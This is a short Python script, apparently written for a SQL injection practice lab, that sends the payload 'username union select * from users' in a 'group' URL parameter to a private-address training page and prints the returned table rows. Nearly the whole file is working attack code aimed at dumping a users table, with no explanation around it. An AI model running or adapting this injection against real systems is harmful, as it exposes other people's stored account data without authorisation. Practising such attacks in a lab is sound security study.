from urllib import request, parse
import lxml.etree as etree
import lxml.html as lh

data = {"group":"id"}
data = {"group":"username"}
data = {"group":"username union select * from users"}


data = parse.urlencode(data)
# http://10.0.1.15/sqlinjection/example6/?group=username
url = "http://10.0.1.15/sqlinjection/example6/?"+data
print(url)
with request.urlopen(url) as resq:
	content = resq.read()

doc = lh.fromstring(content)
tr_elements = doc.xpath("//tr")
for l in tr_elements:
	for e in l:
		# https://zetcode.com/python/fstring/
		#https://www.kite.com/python/answers/how-to-print-a-string-at-a-fixed-width-in-python
		# print(f'{val:.2f}')
		print(f"{e.text_content():10s}", end="|")
		# print(f"{e.text_content():>^10s}", end="|")
		# print("%10s"%e.text_content(), end=" | ")
	print(f"")

